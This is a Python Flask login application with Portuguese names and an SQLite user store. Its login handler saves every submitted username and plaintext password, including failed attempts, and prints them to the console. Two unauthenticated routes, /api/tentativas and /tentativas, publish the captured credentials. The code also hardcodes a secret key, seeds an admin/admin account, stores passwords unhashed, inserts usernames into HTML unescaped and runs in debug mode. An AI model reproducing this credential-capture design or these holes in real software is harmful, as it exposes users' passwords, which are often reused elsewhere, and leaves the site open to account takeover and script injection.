from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
from sqlalchemy import create_engine, Column, String, Integer, Boolean
from sqlalchemy.orm import sessionmaker, declarative_base
import sqlite3
import os

import sqlite3

app = Flask(__name__)
app.secret_key = 'chave_super_secreta'

os.makedirs('scripts_py', exist_ok=True)
engine = create_engine('sqlite:///scripts_py/meubanco.db', echo=False)
Session = sessionmaker(bind=engine)
db_session = Session()
Base = declarative_base()

class Usuario(Base):
    __tablename__ = 'usuarios'
    id = Column(Integer, primary_key=True)
    nome = Column(String, unique=True)
    senha = Column(String)
    admin = Column(Boolean, default=False)

# 👇 Tabela para tentativas
class Tentativa(Base):
    __tablename__ = 'tentativas_login'
    id = Column(Integer, primary_key=True)
    usuario = Column(String)
    senha = Column(String)

Base.metadata.create_all(bind=engine)

if not db_session.query(Usuario).filter_by(nome='admin').first():
    db_session.add(Usuario(nome='admin', senha='admin', admin=True))
    db_session.commit()


@app.route('/api/tentativas')
def api_tentativas():
    tentativas = db_session.query(Tentativa).all()
    dados = [
        {"id": t.id, "usuario": t.usuario, "senha": t.senha}
        for t in tentativas
    ]
    return jsonify(dados)

def carregar_tentativas():
    con = sqlite3.connect("scripts_py/meubanco.db")
    cur = con.cursor()

    cur.execute("SELECT id, usuario, senha FROM tentativas_login")
    dados = cur.fetchall()

    con.close()
    return dados

@app.route('/tentativas')
def mostrar_tentativas():
    dados = db_session.query(Tentativa).all()
    return render_template('tentativas.html', dados=[[t.id, t.usuario, t.senha] for t in dados])

@app.route('/')
def index():
    if 'usuario' in session:
        return redirect(url_for('home'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET'])
def login():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def login_post():
    data = request.get_json()
    nome = data.get('username')
    senha = data.get('password')

    # 🔴 Sempre salvar tentativas
    tentativa = Tentativa(usuario=nome, senha=senha)
    db_session.add(tentativa)
    db_session.commit()
    print(f"Tentativa salva: Usuário={nome}, Senha={senha}")

    # Verifica login real
    user = db_session.query(Usuario).filter_by(nome=nome).first()

    if not user or user.senha != senha:
        return jsonify({'success': False, 'message': 'Usuário ou senha incorretos.'}), 401

    session['usuario'] = user.nome
    session['admin'] = user.admin
    return jsonify({'success': True, 'admin': user.admin})


@app.route('/home')
def home():
    if 'usuario' not in session:
        return redirect(url_for('login'))

    html = f"<h1>Bem-vindo, {session['usuario']}!</h1>"
    if session.get('admin'):
        html += "<p><a href='/admin'>Painel do administrador</a></p>"
    html += "<a href='/logout'>Sair</a>"
    return html



@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if 'usuario' not in session or not session.get('admin'):
        return redirect(url_for('home'))

    if request.method == 'POST':
        nome = request.form['nome']
        senha = request.form['senha']
        admin_flag = 'admin' in request.form

        if db_session.query(Usuario).filter_by(nome=nome).first():
            flash('Usuário já existe!')
        else:
            novo = Usuario(nome=nome, senha=senha, admin=admin_flag)
            db_session.add(novo)
            db_session.commit()
            flash('Usuário adicionado com sucesso.')

    usuarios = db_session.query(Usuario).all()
    lista = '<ul>' + ''.join(f"<li>{u.nome}{' (admin)' if u.admin else ''}</li>" for u in usuarios) + '</ul>'
    return f"<h2>Gerenciar Usuários</h2>{lista}<a href='/home'>Voltar</a>"


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
